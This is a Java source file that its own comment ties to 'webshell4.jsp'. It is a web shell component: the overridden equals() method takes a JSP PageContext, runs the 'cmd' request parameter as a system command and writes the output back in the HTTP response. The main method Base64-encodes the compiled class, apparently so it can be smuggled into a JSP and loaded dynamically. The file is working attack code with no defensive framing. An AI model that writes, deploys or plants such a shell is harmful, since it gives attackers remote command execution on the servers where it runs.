import javax.servlet.ServletOutputStream;
import javax.servlet.jsp.PageContext;
import java.io.IOException;
import java.io.InputStream;
import java.util.Base64;

/**
 * 该类用于 webshell4.jsp
 */
public class Demo {
    @Override
    public boolean equals(Object obj) {
        PageContext pctx = (PageContext)obj;
        InputStream in = null;
        try {
            in = Runtime.getRuntime().exec(pctx.getRequest().getParameter("cmd").split(" ")).getInputStream();
            ServletOutputStream out = pctx.getResponse().getOutputStream();
            int ret = -1;
            byte[] bs = new byte[2048];
            out.print("<pre>");
            while((ret = in.read(bs)) != -1) {
                out.println(new String(bs));
            }
            out.print("</pre>");
        } catch (Exception e) {
            e.printStackTrace();
        }
        return super.equals(obj);
    }

    public static void main(String[] args) {
        Base64.Encoder b64Encoder = Base64.getEncoder();
        InputStream in = Demo.class.getClassLoader().getResourceAsStream("Demo.class");
        try {
            byte[] bs = new byte[in.available()];
            in.read(bs);
            String b64Code = b64Encoder.encodeToString(bs);
            System.out.println(b64Code);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
